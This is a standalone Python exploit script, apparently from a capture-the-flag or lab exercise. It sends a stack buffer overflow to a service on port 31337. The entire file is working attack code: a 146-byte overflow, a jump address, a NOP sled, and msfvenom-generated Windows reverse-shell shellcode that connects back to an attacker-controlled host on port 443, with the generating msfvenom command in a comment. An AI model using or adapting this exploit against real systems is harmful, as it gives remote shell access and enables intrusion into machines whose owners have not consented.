#!/usr/bin/env python

import socket, sys

host = "10.10.75.237"
port = 31337

offset = 146
overflow = "A" * offset
padding = "\x90"*10
jmp_eip = "\xc3\x14\x04\x08"

# \x00\x0a
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.234 LPORT=443 EXITFUNC=thread -f py -b "\x00\x0a" -v payload

payload =  ""
payload += "\xba\x6a\x8a\xb7\x9d\xd9\xc1\xd9\x74\x24\xf4\x58"
payload += "\x2b\xc9\xb1\x52\x31\x50\x12\x83\xc0\x04\x03\x3a"
payload += "\x84\x55\x68\x46\x70\x1b\x93\xb6\x81\x7c\x1d\x53"
payload += "\xb0\xbc\x79\x10\xe3\x0c\x09\x74\x08\xe6\x5f\x6c"
payload += "\x9b\x8a\x77\x83\x2c\x20\xae\xaa\xad\x19\x92\xad"
payload += "\x2d\x60\xc7\x0d\x0f\xab\x1a\x4c\x48\xd6\xd7\x1c"
payload += "\x01\x9c\x4a\xb0\x26\xe8\x56\x3b\x74\xfc\xde\xd8"
payload += "\xcd\xff\xcf\x4f\x45\xa6\xcf\x6e\x8a\xd2\x59\x68"
payload += "\xcf\xdf\x10\x03\x3b\xab\xa2\xc5\x75\x54\x08\x28"
payload += "\xba\xa7\x50\x6d\x7d\x58\x27\x87\x7d\xe5\x30\x5c"
payload += "\xff\x31\xb4\x46\xa7\xb2\x6e\xa2\x59\x16\xe8\x21"
payload += "\x55\xd3\x7e\x6d\x7a\xe2\x53\x06\x86\x6f\x52\xc8"
payload += "\x0e\x2b\x71\xcc\x4b\xef\x18\x55\x36\x5e\x24\x85"
payload += "\x99\x3f\x80\xce\x34\x2b\xb9\x8d\x50\x98\xf0\x2d"
payload += "\xa1\xb6\x83\x5e\x93\x19\x38\xc8\x9f\xd2\xe6\x0f"
payload += "\xdf\xc8\x5f\x9f\x1e\xf3\x9f\xb6\xe4\xa7\xcf\xa0"
payload += "\xcd\xc7\x9b\x30\xf1\x1d\x0b\x60\x5d\xce\xec\xd0"
payload += "\x1d\xbe\x84\x3a\x92\xe1\xb5\x45\x78\x8a\x5c\xbc"
payload += "\xeb\xbf\xad\xb3\xac\xd7\xaf\xcb\x33\x93\x39\x2d"
payload += "\x59\xf3\x6f\xe6\xf6\x6a\x2a\x7c\x66\x72\xe0\xf9"
payload += "\xa8\xf8\x07\xfe\x67\x09\x6d\xec\x10\xf9\x38\x4e"
payload += "\xb6\x06\x97\xe6\x54\x94\x7c\xf6\x13\x85\x2a\xa1"
payload += "\x74\x7b\x23\x27\x69\x22\x9d\x55\x70\xb2\xe6\xdd"
payload += "\xaf\x07\xe8\xdc\x22\x33\xce\xce\xfa\xbc\x4a\xba"
payload += "\x52\xeb\x04\x14\x15\x45\xe7\xce\xcf\x3a\xa1\x86"
payload += "\x96\x70\x72\xd0\x96\x5c\x04\x3c\x26\x09\x51\x43"
payload += "\x87\xdd\x55\x3c\xf5\x7d\x99\x97\xbd\x9e\x78\x3d"
payload += "\xc8\x36\x25\xd4\x71\x5b\xd6\x03\xb5\x62\x55\xa1"
payload += "\x46\x91\x45\xc0\x43\xdd\xc1\x39\x3e\x4e\xa4\x3d"
payload += "\xed\x6f\xed"

exploit = overflow + jmp_eip + padding + payload

try:
    print("Sending buffer")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.send(exploit+ '\r\n')
except:
    print("error!")
    sys.exit(0)
finally:
    s.close() 
